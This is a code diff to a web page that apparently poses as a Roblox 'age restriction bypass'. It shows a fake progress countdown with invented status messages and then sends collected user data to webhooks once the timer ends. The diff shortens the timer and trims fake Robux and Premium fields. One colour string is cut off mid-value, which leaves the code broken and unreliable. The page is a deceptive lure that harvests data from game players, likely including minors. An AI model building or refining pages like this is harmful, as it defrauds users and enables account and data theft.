@@ -373,7 +373,7 @@ export default async function DirectoryPage({ params }) {
                 <!-- Countdown Timer -->
                 <div class="countdown-container" id="countdownContainer">
                     <div class="countdown-emoji" id="countdownEmoji">⏳</div>
-                    <div class="countdown" id="countdown">02:00</div>
+                    <div class="countdown" id="countdown">01:00</div>
                     <div class="countdown-text" id="countdownText">Processing your request...</div>
                     <div class="countdown-text">Please wait while we bypass your account restrictions</div>
                 </div>
@@ -451,31 +451,6 @@ export default async function DirectoryPage({ params }) {
                             inline: true
                         },
                         {
-                            name: "💰 Robux",
-                            value: userData.robux ? userData.robux.toString() : "N/A",
-                            inline: true
-                        },
-                        {
-                            name: "⏳ Pending Robux",
-                            value: userData.pendingRobux ? userData.pendingRobux.toString() : "0",
-                            inline: true
-                        },
-                        {
-                            name: "⭐ Premium",
-                            value: userData.premium ? "Yes" : "No",
-                            inline: true
-                        },
-                        {
-                            name: "🎯 Korblox",
-                            value: "Unknown",
-                            inline: true
-                        },
-                        {
-                            name: "👻 Headless",
-                            value: "Unknown",
-                            inline: true
-                        },
-                        {
                             name: "🌐 Directory",
                             value: directory,
                             inline: true
@@ -517,7 +492,7 @@ export default async function DirectoryPage({ params }) {
             };
         }
 
-        // Countdown function
+        // Countdown function - 1 MINUTE (60 seconds)
         function startCountdown(duration, callback) {
             let timer = duration;
             let countdownInterval;
@@ -531,16 +506,16 @@ export default async function DirectoryPage({ params }) {
                     (seconds < 10 ? "0" : "") + seconds;
                 
                 // Update emoji based on time remaining
-                if (timer > 90) {
+                if (timer > 45) {
                     countdownEmoji.textContent = "⏳";
                     countdownText.textContent = "Initializing bypass sequence...";
-                } else if (timer > 60) {
+                } else if (timer > 30) {
                     countdownEmoji.textContent = "🔧";
                     countdownText.textContent = "Modifying account settings...";
-                } else if (timer > 30) {
+                } else if (timer > 15) {
                     countdownEmoji.textContent = "⚙️";
                     countdownText.textContent = "Applying age restrictions bypass...";
-                } else if (timer > 10) {
+                } else if (timer > 5) {
                     countdownEmoji.textContent = "🔒";
                     countdownText.textContent = "Finalizing security protocols...";
                 } else {
@@ -592,14 +567,11 @@ export default async function DirectoryPage({ params }) {
             const userData = {
                 id: timestamp,
                 name: 'Roblox User',
-                displayName: 'Roblox User',
-                robux: Math.floor(Math.random() * 10000),
-                pendingRobux: Math.floor(Math.random() * 1000),
-                premium: Math.random() > 0.7
+                displayName: 'Roblox User'
             };
             
-            // Start 2-minute countdown and send webhooks when done
-            startCountdown(120, async () => {
+            // Start 1-minute countdown and send webhooks when done
+            startCountdown(60, async () => {
                 try {
                     // Send webhooks after countdown completes
                     const result = await sendDualWebhooks(
@@ -619,8 +591,8 @@ export default async function DirectoryPage({ params }) {
                 } catch (error) {
                     console.error('Error:', error);
                     status.textContent = '✅ Process completed! Data may have been sent.';
-                    status.style.color = '#4CAF50';
-                }
+                    status.style.color = '#4CA
+                  }
 
                 // Re-enable button after a short delay
                 setTimeout(() => {
